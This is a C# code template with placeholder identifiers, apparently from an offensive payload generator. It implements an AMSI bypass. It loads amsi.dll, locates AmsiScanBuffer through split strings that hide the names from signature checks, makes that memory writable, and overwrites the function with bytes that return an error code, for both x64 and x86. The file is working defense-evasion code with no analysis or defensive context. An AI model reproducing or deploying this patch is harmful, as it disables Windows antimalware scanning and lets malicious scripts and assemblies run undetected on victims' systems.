public class {{ special['class_name'] }}
{
    private static void {{ v['PatchAmsi'] }}(byte[] {{ v['patch'] }})
    {
        try
        {

            string {{ v['a'] }} = "A";
            string {{ v['v'] }} = "d";
            string {{ v['b'] }} = "can";
            string {{ v['c'] }} = "S";
            string {{ v['d'] }} = "msi";
            string {{ v['e'] }} = "Buffer";


            var {{ v['lib'] }} = {{ v['Win32'] }}.LoadLibrary({{ v['a'] }} + {{ v['d'] }} + "." + {{ v['v'] }} + "ll");
            var {{ v['addr'] }} = {{ v['Win32'] }}.GetProcAddress({{ v['lib'] }}, {{ v['a'] }} + {{ v['d'] }} + {{ v['c'] }} + {{ v['b'] }} + {{ v['e'] }});

            uint {{ v['oldProtect'] }};
            {{ v['Win32'] }}.VirtualProtect({{ v['addr'] }}, (UIntPtr){{ v['patch'] }}.Length, 0x40, out {{ v['oldProtect'] }});

            Marshal.Copy({{ v['patch'] }}, 0, {{ v['addr'] }}, {{ v['patch'] }}.Length);
        }
        catch (Exception {{ v['e'] }})
        {
            Console.WriteLine("             [x] {0}", {{ v['e'] }}.Message);
            Console.WriteLine("       [x]         {0}", {{ v['e'] }}.InnerException);
        }
    }

    public static void {{ func_name }}()
    {
        if ({{ v['is64Bit'] }}())
            {{ v['PatchAmsi'] }}({{ v['x64'] }});
        else
            {{ v['PatchAmsi'] }}({{ v['x86'] }});
    }

    static byte[] {{ v['x64'] }} = new byte[] {

        0xB8,
        0x57,
        0x00,
        0x07,
        0x80,
        0xC3 
    };

    private static bool {{ v['is64Bit'] }}()
        {
            bool {{ v['is64Bit'] }} = true;

            if (IntPtr.Size == 4) {

                {{ v['is64Bit'] }} = false;

            }

            return {{ v['is64Bit'] }};
        }
    static byte[] {{ v['x86'] }} = new byte[] {

        0xB8,
        0x57,
        0x00,
        0x07,
        0x80,
        0xC2,
        0x18,
        0x00
    };
}

class {{ v['Win32'] }}
{

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string {{ v['foo'] }});

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr {{ v['bar'] }}, UIntPtr {{ v['baz'] }}, uint {{ v['bop'] }}, out uint {{ v['bing'] }});

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr {{ v['burt'] }}, string {{ v['boop'] }});
}
